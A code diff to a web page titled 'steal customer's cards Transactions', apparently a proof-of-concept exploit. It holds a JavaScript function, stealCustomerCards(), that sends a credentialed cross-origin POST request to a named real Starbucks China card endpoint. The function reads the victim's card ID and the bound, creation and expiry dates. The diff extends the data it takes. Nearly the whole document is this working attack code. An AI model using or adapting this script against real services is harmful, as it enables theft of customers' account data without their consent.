@@ -26,7 +26,11 @@ steal customer's cards Transactions
 </div>
 <script>
 	var cardsID;
+	
 	function stealCustomerCards(){
+		var boundAt;
+		var createdAt;
+		var expiredAt;
 		$.ajax({
 			    url : 'https://cards.starbucks.com.cn/cards',
 			    type : 'POST',
@@ -37,8 +41,11 @@ steal customer's cards Transactions
 			     withCredentials: true
 			 },
 			    success : function(response, textStatus, jqXhr) {
-				document.getElementById("customer").innerHTML = JSON.stringify(response);
 				cardsID = response.data[0].id;
+				boundAt = response.data[0].boundAt;
+				createdAt = response.data[0].createdAt;
+				expiredAt = response.data[0].expiredAt;
+				document.getElementById("customer").innerHTML = "Your cardsId:"+cardsID+",boundAt:"+boundAt+",createdAt:"+createdAt+",expiredAt:"+expiredAt;
                                 console.log(cardsID);
 			    },
 			    error : function(jqXHR, textStatus, errorThrown) {
